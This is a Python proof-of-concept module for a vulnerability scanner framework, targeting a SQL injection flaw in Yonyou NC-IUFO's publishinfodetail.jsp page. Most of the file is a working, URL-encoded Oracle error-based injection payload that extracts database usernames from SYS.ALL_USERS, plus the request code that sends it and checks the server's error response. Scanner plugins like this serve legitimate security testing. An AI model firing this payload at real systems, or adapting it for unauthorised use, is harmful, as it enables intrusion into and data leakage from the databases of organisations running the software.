# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0042'  # 平台漏洞编号，留空
    name = '用友NC-IUFO系统通用 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-30'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友NC-IUFO epp/detail/publishinfodetail.jsp 参数过滤不完整，SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=089208'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3bc9c354-8b85-429c-a8ae-e8aa3c96d633'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2014-089208
            payload = "/epp/detail/publishinfodetail.jsp?pk_message=1002A31000000000BS0X%27%20AND%209561%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28104%29%7C%7CCHR%28114%29%7C%7CCHR%28113%29%7C%7C%28REPLACE%28REPLACE%28REPLACE%28REPLACE%28%28SELECT%20NVL%28CAST%28USERNAME%20AS%20VARCHAR%284000%29%29%2CCHR%2832%29%29%20FROM%20%28SELECT%20USERNAME%2CROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS%20ORDER%20BY%201%20ASC%29%20WHERE%20LIMIT%3D34%29%2CCHR%2832%29%2CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%2CCHR%2836%29%2CCHR%28113%29%7C%7CCHR%28100%29%7C%7CCHR%28113%29%29%2CCHR%2864%29%2CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2CCHR%2835%29%2CCHR%28113%29%7C%7CCHR%28117%29%7C%7CCHR%28113%29%29%29%7C%7CCHR%28113%29%7C%7CCHR%28105%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20scanf"
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 500 and 'SYSTEM' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
